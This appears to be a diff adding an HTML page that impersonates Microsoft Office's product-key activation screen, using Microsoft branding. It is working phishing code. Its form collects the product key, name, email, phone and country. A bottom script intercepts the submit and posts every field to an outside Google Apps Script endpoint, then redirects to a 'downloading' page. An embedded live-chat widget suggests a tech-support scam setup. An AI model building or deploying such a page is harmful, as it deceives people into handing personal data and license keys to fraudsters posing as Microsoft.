@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="de">
+  <head>
+    <title>Enter your product key - Office</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/css/style.css" >
+    <link rel="shortcut icon" href="assets/img/microsoft-icon.ico">
+
+
+    <script> 
+        function onlyNumberKey(evt) { 
+              
+            // Only ASCII character in that range allowed 
+            var ASCIICode = (evt.which) ? evt.which : evt.keyCode 
+            if (ASCIICode > 31 && (ASCIICode < 48 || ASCIICode > 57)) 
+                return false; 
+            return true; 
+        } 
+    </script> 
+
+  </head>
+  <body>
+    <header>
+      <div class="imgHead">
+        <a href="index.html">
+        <img src="assets/img/header.png" alt="Header" class="headIMG"/>
+        </a>
+      </div>
+    </header>
+    <section class="mainSec">
+        <div class="topHeading">
+          <h2>Hi. Let's get started.</h2>
+        </div>
+        <div class="box">
+          <div class="enterBox">
+            <br>
+            <h3 class="num1"> 1</h3>
+          </div>
+          <div class="enterBox">
+            <h3> Registered</h3>
+          </div>
+        </div>
+        <div class="box2">
+          <div class="enterBox2">
+            <br>
+            <h3 class="num1">2</h3>
+          </div>
+          <div class="enterBox2">
+            <h3>Enter your product key</h3>
+              <div class="entryForm">
+                <form class="keyform" id="dataForm" action="downloading.html">
+                    <div class="keyBox">
+                      <img src="assets/img/microsoft-logo.png" style="width:120px;">
+                      <br><br>
+                        <input type="text" name="key1" class="key1" maxlength="5" placeholder="XXXXX" required>
+                        <input type="text" name="key2" class="key2" maxlength="5" placeholder="XXXXX">
+                        <input type="text" name="key3" class="key3" maxlength="5" placeholder="XXXXX" required>
+                        <input type="text" name="key4" class="key4" maxlength="5" placeholder="XXXXX">
+                        <input type="text" name="key5" class="key5" maxlength="5" placeholder="XXXXX" required>
+                    </div>
+					
+                    <div class="infoBox">
+                      <label for="name">Name </label><br>
+                      <input type="text" name="name" class="infoInput" required><br><br>
+                       <label for="name">E-Mail-Address</label><br>
+                      <input type="email" name="email" class="infoInput" required><br><br>
+                       <label for="name">Phone </label><br>
+                      <input type="tel" id="phone" name="phone" maxlength="13" onkeypress="return onlyNumberKey(event)" required><br><br>
+
+                      <select class="selectCountry" id="countryID" name="country" required="">
+                           <option value="">Choose country</option>
+                         <option value="USA">USA</option>
+                          <option value="CANADA">CANADA</option>
+                          <option value="UNITED KINGDOM">UNITED KINGDOM</option>
+                          <option value="Other">Other</option>
+                      </select><br><br>
+                      <button type="submit" name="submit" class="btnSubmit">Next </button>
+                    </div>
+                </form>
+              </div>
+          </div>
+          <div class="box3">
+          <div class="enterBox3">
+            <br>
+            <h3 class="num1">3</h3>
+          </div>
+          <div class="enterBox3">
+            <h3>Get your apps</h3>
+            <div class="addSpace">
+        </div>
+          </div>
+        </div>
+        </div>
+
+
+        </section>
+
+        <footer>
+          <div class="imgFoot">
+            <img src="assets/img/footer.png" class="footIMG" />
+          </div>
+        </footer>           
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzhv3x1UIZynsCIrXVkmJDVsxDvUSMOYTMSpTmz5s7WafqMJfRY6_NohcQnCkRxhyP0/exec';
+    const form = document.forms['dataForm'];
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert('Data Submitted Successfully!'))
+        .then(response =>window.location = "downloading.html")
+        .catch(error => console.error('Error!', error.message));
+    });
+  </script>
+
+        <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+(function(){
+var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+s1.async=true;
+s1.src='https://embed.tawk.to/64cbe60794cf5d49dc6843a6/1h6u7l3t1';
+s1.charset='UTF-8';
+s1.setAttribute('crossorigin','*');
+s0.parentNode.insertBefore(s1,s0);
+})();
+</script>
+<!--End of Tawk.to Script-->
+          
+  </body>
+</html>
